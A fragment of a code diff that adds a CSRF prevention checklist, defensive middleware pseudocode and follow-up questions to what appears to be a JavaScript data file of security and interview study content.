+            a: "**CSRF Prevention Checklist:**\n\n**Cookies & Sessions**\n☑ Use `Secure` + `HttpOnly`\n☑ Set `SameSite=Lax` (or Strict if possible)\n\n**Token Defense**\n☑ CSRF token required for unsafe methods (POST/PUT/PATCH/DELETE)\n☑ Rotate tokens when user logs in/out (or per session)\n☑ Reject missing/invalid tokens\n\n**Request Validation**\n☑ Validate `Origin` header for unsafe requests\n☑ Strict CORS policy (don’t allow `*` with credentials)\n\n**App Practices**\n☑ No state changes via GET\n☑ Protect critical endpoints (email/password/payment/admin actions)\n☑ Monitor suspicious request patterns\n\n**Remember:** If you have XSS, attacker can often bypass CSRF tokens — fix XSS too.",
+            code: `// Quick server-side logic (pseudocode)\nfunction csrfMiddleware(req) {\n  const unsafe = ['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method);\n  if (!unsafe) return true;\n\n  // 1) Origin check\n  const origin = req.headers.origin;\n  if (origin && origin !== 'https://app.example.com') return false;\n\n  // 2) Token check\n  const token = req.headers['x-csrf-token'];\n  if (!token) return false;\n\n  // validate token against session / server store\n  return validateCsrfToken(req.sessionId, token);\n}\n\nconsole.log('CSRF checklist enforced via SameSite + token + origin checks');`,
+            playground: true,
+            tags: ["Security", "CSRF", "Checklist", "OWASP", "Backend"],
+            followUps: [
+              "What breaks if we set SameSite=Strict everywhere?",
+              "How would you test CSRF vulnerabilities (manual + automated)?",
+              "How does CSRF protection differ between traditional forms and JSON APIs?"
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
     id: 'behavioral',
     title: 'Behavioral & Tips',
     items: [
